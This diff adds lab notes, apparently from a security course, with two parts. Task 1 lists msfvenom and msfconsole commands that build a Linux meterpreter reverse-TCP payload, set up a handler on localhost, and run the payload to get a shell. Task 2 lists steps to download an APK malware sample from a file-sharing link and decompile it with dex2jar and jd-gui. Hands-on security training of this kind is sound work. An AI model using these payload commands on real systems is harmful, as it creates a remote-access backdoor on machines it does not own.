@@ -1,0 +1,31 @@
+TASK 1: MALWARE GENERATION (F1 = first shell, F2 = second shell)
+F1: setxkbmap -layout it
+F1: msfvenom -l payload | grep -E 'linux.*x86.*reverse_tcp'
+F1: msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -f elf > shell.elf
+F2: msfconsole
+F2: use multi/handler
+F2: set PAYLOAD linux/x86/meterpreter/reverse_tcp
+F2: show options
+F2: set LHOST 127.0.0.1
+F2: set LPORT 4444
+F2: shows options
+F2: exploit
+F1: chmod +x shell.elf
+F1: ./shell.elf
+F2: help
+
+TASK 2: MALWARE ANALYSIS
+ping www.google.it
+sudo ifconfig eth0 up
+sudo dhclient eth0
+ping www.google.it
+FIREFOX: https://mega.nz/file/oElwBCbK#hhXmCNqgT4DKMQ7scWW7eMYcbFg2peGhfyOeXiH-284
+XARCHIVER: analysis .7z
+cd analysis
+java -jar APKParser.jar  fd694cf5ca1dd4967ad6e8c67241114c.apk 
+chmod 777 d2j-dex2jar.sh
+chmod 777 d2j_invoke.sh
+./d2j-dex2jar.sh fd694cf5ca1dd4967ad6e8c67241114c.apk
+java -jar jd-gui-1.6.6.jar
+
+
